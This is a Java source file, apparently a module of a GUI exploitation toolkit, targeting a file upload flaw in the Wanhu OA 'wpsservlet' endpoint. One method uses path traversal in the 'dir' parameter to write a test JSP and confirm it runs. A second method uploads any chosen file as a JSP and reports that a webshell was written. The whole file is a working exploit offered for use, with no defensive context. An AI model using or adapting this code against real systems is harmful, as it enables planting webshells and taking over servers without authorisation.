package exp.oa.wanhuoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.util.Date;
import java.util.HashMap;

public class wanhu_wpsservlet_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url,textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }
    private Boolean att(String url, TextArea textArea) {
        String tt = "R4gT"+(new Date()).getTime();
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b");
        String payload = "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"NewFile\"; filename=\""+tt+".jsp\"\r\n" +
                "\r\n" +
                "<% out.println(\"R4g\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n" +
                "--59229605f98b8cf290a7b8908b34616b--\r\n";

        HttpTools.post(url + "/defaultroot/wpsservlet?option=saveNewFile&newdocId="+tt+"&dir=../platform/portal/layout/&fileType=.jsp", payload, head, "utf-8");
        Response response = HttpTools.get(url + "/defaultroot/platform/portal/layout/"+tt+".jsp", new HashMap<String, String>(), "utf-8");
        if (response.getCode() == 200 && response.getText().contains("R4g")) {
            Platform.runLater(() -> {
                textArea.appendText("\n [ wanhu_wpsservlet_upload ]");
                textArea.appendText("\n 文件写入成功\n " + url + "/defaultroot/platform/portal/layout/"+tt+".jsp\n");
                textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n");
            });
            return false;
        }
    }

    private Boolean attcmd(String url,String cmd, TextArea textArea,TextArea textArea_cmd) {
        String tt = "R4gS"+(new Date()).getTime();
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b");
        String payload = "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"NewFile\"; filename=\""+tt+".jsp\"\r\n" +
                "\r\n" +
                Methods.readFile(cmd)+
                "\r\n" +
                "--59229605f98b8cf290a7b8908b34616b--\r\n";

        HttpTools.post(url + "/defaultroot/wpsservlet?option=saveNewFile&newdocId="+tt+"&dir=../platform/portal/layout/&fileType=.jsp", payload, head, "utf-8");
        Response response = HttpTools.get(url + "/defaultroot/platform/portal/layout/"+tt+".jsp", new HashMap<String, String>(), "utf-8");
        if (response.getCode() == 200) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell写入成功\n " + url + "/defaultroot/platform/portal/layout/"+tt+".jsp");
            });
            return true;
        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell写入失败");
            });
            return false;
        }
    }
}
